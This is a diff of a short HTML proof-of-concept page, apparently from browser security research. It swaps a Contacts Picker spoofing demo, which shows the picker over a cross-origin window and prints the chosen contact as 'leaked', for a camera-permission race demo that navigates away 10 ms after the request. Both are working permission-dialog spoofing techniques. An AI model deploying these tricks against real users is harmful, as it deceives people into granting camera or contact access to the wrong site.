@@ -1,28 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
-    <head>
-        <title>PoC</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <script>
-            onclick = async () => {
-                (async () => {
-                    let contacts = await navigator.contacts.select(["name"], {});
-                    document.write(`
-                        <h1>
-                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
-                        </h1>
-                    `);
-                })();
-                open("https://www.google.com", "PoC", "_blank");
-            }
-        </script>
-    </head>  
-    <body>
-        <br><br><br>
-        <center>
-            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
-        </center>
-    </body>
-  </body>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>iOS Permission Race Demo</title>
+<script>
+onclick = async () => {
+    // Trigger camera permission
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            document.body.innerHTML += "<h2>Camera granted</h2>";
+        })
+        .catch(err => {
+            document.body.innerHTML += "<h2>Permission denied</h2>";
+        });
+
+    // Immediately try to navigate
+    setTimeout(() => {
+        window.location.href = "https://example.com";
+    }, 10);
+}
+</script>
+</head>
+<body>
+<h1>Tap anywhere</h1>
+</body>
 </html>
